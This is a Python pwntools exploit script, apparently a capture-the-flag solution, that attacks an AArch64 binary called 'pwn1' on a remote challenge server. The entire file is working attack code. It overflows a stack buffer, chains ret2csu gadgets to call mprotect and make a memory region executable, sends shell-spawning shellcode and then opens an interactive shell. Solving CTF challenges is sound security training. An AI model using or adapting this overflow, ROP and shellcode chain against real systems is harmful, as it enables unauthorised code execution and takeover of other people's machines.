from pwn import *

#context(arch='aarch64', os='linux')

#p = process(['qemu-aarch64', './pwn1'])
p = remote('node4.buuoj.cn', 29490)

elf = ELF('./pwn1')
mprotect_plt = elf.plt['mprotect']

len = 0x58 - 0x10 #overflow padding

csu_1 = 0x4008cc
csu_2 = 0x4008ac

shelladdr = 0x411068 + 8

payload = b'a' * len + p64(csu_1)
payload += p64(0x114514) + p64(csu_2) #x29 , x30 -> ret
payload += p64(0) + p64(1) #x19 -> counter, #x20 counter
payload += p64(shelladdr - 8) + p64(7) #x21 -> got, #x22 -> x2
payload += p64(0x1000) + p64(shelladdr) #x23 -> x1, x24 -> w0
payload += p64(0x114514) + p64(shelladdr)

shellcode = asm(shellcraft.aarch64.sh(), arch='aarch64')

p.sendafter(b'Name:', p64(mprotect_plt) + shellcode)
sleep(0.1)
p.send(payload)

p.interactive()